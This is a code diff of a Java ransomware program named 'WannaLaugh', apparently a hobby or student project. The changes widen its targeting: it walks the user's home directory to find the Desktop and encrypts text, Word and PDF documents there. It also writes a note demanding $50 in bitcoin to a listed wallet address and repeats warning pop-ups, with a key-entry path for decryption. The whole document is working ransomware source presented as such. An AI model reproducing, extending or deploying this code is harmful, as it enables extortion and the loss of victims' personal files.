@@ -1,35 +1,23 @@
 package randsom;
-import java.awt.event.ActionEvent;
-import java.awt.event.ActionListener;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
-import java.nio.file.Files;
-import java.nio.file.Path;
-import java.nio.file.Paths;
-import java.security.MessageDigest;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.HashSet;
+import java.util.LinkedList;
 import java.util.List;
-import java.util.stream.Collectors;
-import java.util.stream.Stream;
 
-import javax.swing.JButton;
 import javax.swing.JFrame;
 import javax.swing.JOptionPane;
-import javax.swing.event.ListSelectionEvent;
 
 
 public class fileReader {
 	
 	private static chiper c;
-	private static String aesKeyString;
 	private static HashSet<String> types;
-	private static ArrayList<byte[]> filehashes;
-	private static int counter;
 	private static boolean decryptMode = false;
 	
 	static String warning = "Hey! Your files are now encrypted.\n" 
@@ -39,31 +27,52 @@ public class fileReader {
 			+ "to retrieve your decryption key!";
 	static final JFrame frame = new JFrame();
 	
+	static private ArrayList<File> files;
+	
 	public static void main(String args[]) {
 		
 		c = new chiper();
 		types = new HashSet<>(Arrays.asList("txt", "docx", "pdf", "doc"));
-		filehashes = new ArrayList<>();
-		ArrayList<File> files = new ArrayList<>();
-		getFile(new File(System.getProperty("user.dir")), files);
+		files = new ArrayList<>();
 		
+		lookup(new File(System.getProperty("user.home")));		
+		frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
+		
+		JOptionPane.showMessageDialog(frame, "Hello !!!", "WannaLaugh!!!", JOptionPane.WARNING_MESSAGE, null);
 		
 		if(decryptMode) {
 			String privateKey = JOptionPane.showInputDialog("Enter your decryption key: ");
 			if(privateKey != null) {
 				c.privateInit(privateKey);
 				decryptAlldoc(files);
+				deleteReadMe();
+			}
+		}
+		else {
+			if(!files.isEmpty()) {
+				encryptAlldoc(files);
+				ReadMe();
+				JOptionPane.showMessageDialog(frame, warning, "WannaLaugh!!!", JOptionPane.WARNING_MESSAGE, null);
+				JOptionPane.showMessageDialog(frame, warning, "WannaLaugh!!!", JOptionPane.WARNING_MESSAGE, null);
+				JOptionPane.showMessageDialog(frame, warning, "WannaLaugh!!!", JOptionPane.WARNING_MESSAGE, null);
 			}
 			
 		}
-		else {
-			encryptAlldoc(files);
-			ReadMe();
-			JOptionPane.showMessageDialog(frame, warning, "WannaLaugh!!!", JOptionPane.WARNING_MESSAGE, null);
-			JOptionPane.showMessageDialog(frame, warning, "WannaLaugh!!!", JOptionPane.WARNING_MESSAGE, null);
-			JOptionPane.showMessageDialog(frame, warning, "WannaLaugh!!!", JOptionPane.WARNING_MESSAGE, null);
-		}
 		
+		System.exit(0);
+	}
+	
+	private static void lookup(File dir) {
+		try {
+			File d = new File(dir, "Desktop");
+			if(d.exists())
+				getFile(d, files);
+			else {
+				for(File f : dir.listFiles())
+					if(f.isDirectory())
+						lookup(f);
+			}
+		}catch(Exception ex) {}
 	}
 	
 	private static void ReadMe() {
@@ -71,15 +80,25 @@ public class fileReader {
 		try {
 			DataOutputStream writer;
 			writer = new DataOutputStream( new FileOutputStream("HOW_TO_DECRYPT_YOUR_FILES.txt"));
-			writer.writeUTF("*** TO DECRYPT YOUR FILES ***\n");
-			writer.writeUTF("*** SEND MONEY $50 USD WORTH OF BITCOIN ***\n");
-			writer.writeUTF("*** TO THIS BITCOIN ACCOUNT ***\n");
-			writer.writeUTF("*** bc1quum7ledvpnh7grlruerf2jxrjptq60r7sqjcyc ***\n");
-			writer.writeUTF("*** TO RETRIEVE THE DECRYPTION KEY ***\n");
+			writer.writeUTF("HOW TO DECRPTY YOU FILES:\r\n" + 
+					"\r\n" + 
+					"1. SEND $50 USD WORTH OF BITCOIN TO bc1quum7ledvpnh7grlruerf2jxrjptq60r7sqjcyc\r\n" + 
+					"   TO RETREIVE YOUR DECRYPTION KEY.\r\n" + 
+					"\r\n" + 
+					"2. RUN THE PROGRAM AGAIN WITH THE KEY TO DECRYPT\r\n" + 
+					"\r\n" + 
+					"*** WANNALAUGH ***");
 			writer.flush();
 			writer.close();			
 		}
 		catch(Exception ex) {}
+	}
+	
+	private static void deleteReadMe() {
+		try {
+			File f = new File("HOW_TO_DECRYPT_YOUR_FILES.txt");
+			f.delete();
+		}catch(Exception ex) {}
 	}
 	
 	private static void getFile(File dir, List<File> files) {
@@ -125,7 +144,6 @@ public class fileReader {
 				writer.write(edata);
 				writer.flush();
 				writer.close();
-				counter++;
 					
 			}		
 		}
